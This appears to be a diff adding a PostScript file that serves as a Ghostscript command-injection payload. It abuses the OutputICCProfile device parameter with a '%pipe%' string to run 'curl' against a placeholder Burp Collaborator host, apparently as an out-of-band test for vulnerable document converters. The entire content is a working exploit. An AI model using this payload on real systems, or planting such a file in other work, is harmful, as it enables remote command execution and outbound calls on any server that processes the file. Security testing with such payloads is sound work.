@@ -1,0 +1,4 @@
+%!PS
+currentdevice null true mark /OutputICCProfile (%pipe%curl http://inputburpcollaborator)
+.putdeviceparams
+quit
